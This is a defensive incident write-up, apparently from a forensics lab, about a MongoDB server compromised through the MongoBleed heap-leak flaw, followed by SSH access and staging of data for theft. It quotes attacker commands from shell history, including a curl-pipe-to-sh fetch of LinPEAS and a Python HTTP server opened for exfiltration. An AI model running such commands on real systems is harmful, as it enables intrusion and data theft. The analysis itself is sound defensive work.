# Case Writeup: Mangobleed — MongoDB Server Compromise

## Summary

A secondary MongoDB server (`mongodbsync`) was compromised via the MongoBleed vulnerability (CVE-2025-14847). The attacker exploited a heap memory disclosure flaw to leak credentials, then gained SSH access as `mongoadmin`, attempted privilege escalation using LinPEAS, and staged the MongoDB data directory for exfiltration via a Python HTTP server. Confidence: **High** based on log correlation and artifact analysis.

---

## Timeline

| Timestamp (UTC) | Event | Source | Significance |
|-----------------|-------|--------|--------------|
| 2025-12-29 05:11:47 | MongoDB server logs begin | `/var/log/mongodb/mongod.log` | Baseline start of log window |
| 2025-12-29 05:25:52 | First connection from attacker IP `65.0.76.43` | `mongod.log` (NETWORK) | Initial reconnaissance / exploitation begins |
| 2025-12-29 05:25:52 – 05:40:03 | 75,260 rapid connections from `65.0.76.43` | `mongod.log` | MongoBleed exploitation — heap memory leak attempts |
| 2025-12-29 05:40:03 | Successful SSH login as `mongoadmin` via keyboard-interactive auth | `/var/log/auth.log` | Credential obtained from MongoBleed leak; attacker gains shell |
| 2025-12-29 ~05:40+ | Attacker runs `whoami`, `ls -la` | `/home/mongoadmin/.bash_history` | Initial host reconnaissance |
| 2025-12-29 ~05:41+ | LinPEAS executed in-memory: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` | `.bash_history` | Privilege escalation enumeration |
| 2025-12-29 ~05:42+ | Attacker navigates to `/var/lib/mongodb/` | `.bash_history` | Target data directory identified |
| 2025-12-29 ~05:43+ | Attacker attempts `apt install zip` (likely failed — no sudo) | `.bash_history` | Compression attempt for exfil |
| 2025-12-29 ~05:44+ | Attacker starts Python HTTP server: `python3 -m http.server 6969` | `.bash_history` | Exfiltration staging |
| 2025-12-29 ~05:45+ | Attacker exits session | `.bash_history` | Session ends |
| 2025-12-29 06:09:37 | MongoDB server logs end | `mongod.log` | End of log window |

---

## Attack Narrative

**Initial Access:** The attacker exploited CVE-2025-14847 (MongoBleed) against an unpatched MongoDB instance. This vulnerability allows an attacker to send a crafted BSON payload with a manipulated `uncompressedSize` field, causing the server to allocate an oversized buffer populated with uninitialized heap memory. When error handling returns this buffer, sensitive data (credentials, API keys) leak to the attacker.

**Credential Harvesting:** Over ~14 minutes, the attacker made 75,260 connections, likely harvesting heap fragments until valid SSH credentials for `mongoadmin` were obtained.

**Execution:** At 05:40:03, the attacker authenticated via SSH using keyboard-interactive/PAM. They immediately ran reconnaissance commands (`whoami`, `ls -la`) and then executed LinPEAS directly in memory to enumerate privilege escalation vectors.

**Staging for Exfiltration:** The attacker navigated to `/var/lib/mongodb/` (the MongoDB data directory), attempted to install `zip` (failed without sudo), and launched a Python HTTP server on port 6969 to stage data for exfiltration.

**Exit:** The attacker exited the session. It is unclear whether data was successfully exfiltrated.

---

## Key IOCs

| Type | Value | Context |
|------|-------|---------|
| IP Address | `65.0.76.43` | Attacker source IP (MongoBleed + SSH) |
| Port | `6969` | Python HTTP server for exfil staging |
| Tool | LinPEAS (`linpeas.sh`) | Privilege escalation enumeration |
| URL | `https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh` | LinPEAS download URL |
| Account | `mongoadmin` | Compromised user account |
| Directory | `/var/lib/mongodb/` | Targeted data directory |

---

## Findings & Confidence

| Finding | Evidence | Confidence | Notes |
|---------|----------|------------|-------|
| MongoBleed exploitation occurred | 75,260 rapid connections from single IP in 14 min window | High | Pattern matches known exploitation behavior |
| Credentials leaked via heap disclosure | SSH auth success immediately after MongoDB exploitation window | High | Timing correlation; no other credential source identified |
| Privilege escalation attempted | LinPEAS execution in `.bash_history` | High | Direct artifact |
| Exfiltration staged | Python HTTP server on port 6969 in data directory | High | Direct artifact |
| Exfiltration success unknown | No outbound connection logs available | Medium | Would need netflow/VPC flow logs to confirm |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Initial Access | Exploit Public-Facing Application | T1190 | MongoBleed (CVE-2025-14847) against MongoDB |
| Credential Access | Exploitation for Credential Access | T1212 | Heap memory leak disclosed SSH credentials |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 | Bash commands in `.bash_history` |
| Discovery | System Information Discovery | T1082 | `whoami`, `ls -la` |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | LinPEAS enumeration (attempted) |
| Exfiltration | Exfiltration Over Web Service | T1567 | Python HTTP server on port 6969 |

---

## Lessons Learned

**What I did well:**
- Identified the CVE through scenario context research and understood the technical mechanism
- Correlated MongoDB logs with auth.log to establish the credential theft → SSH access chain
- Recognized LinPEAS execution pattern and exfiltration staging

**What I missed initially:**
- Did not immediately know to pivot from MongoDB logs to `/var/log/auth.log` for SSH correlation
- Linux filesystem knowledge gap slowed triage (didn't know where MongoDB logs live by default)
- Could have used bash/Python scripting to parse JSON logs more efficiently

**What I'd do differently:**
- Build a reference cheatsheet for Linux log locations by service
- Script JSON log parsing for large files upfront
- Check for outbound connections (netstat snapshot, VPC flow logs if cloud) earlier

---

## Next Actions (if real incident)

- [ ] **Contain:** Isolate `mongodbsync` from network immediately
- [ ] **Preserve:** Snapshot disk and memory before remediation
- [ ] **Block:** Firewall rule for `65.0.76.43` at perimeter
- [ ] **Patch:** Update MongoDB to patched version (post-CVE-2025-14847)
- [ ] **Rotate:** Reset `mongoadmin` credentials and audit for credential reuse
- [ ] **Hunt:** Search for `65.0.76.43` across all hosts and cloud logs
- [ ] **Detect:** Deploy detection for LinPEAS download patterns and Python HTTP servers on non-standard ports
- [ ] **Review:** Audit why MongoDB was exposed and whether auth was properly configured

---

## References

- [Akamai: CVE-2025-14847 — All You Need to Know About MongoBleed](https://www.akamai.com/blog/security-research/cve-2025-14847-all-you-need-to-know-about-mongobleed)
- [UAC - Unix-like Artifacts Collector](https://github.com/tclahr/uac)
- [Linux Forensics: Collecting a Triage Image Using UAC](https://www.thedfirspot.com/post/linux-forensics-collecting-a-triage-image-using-the-uac-tool)
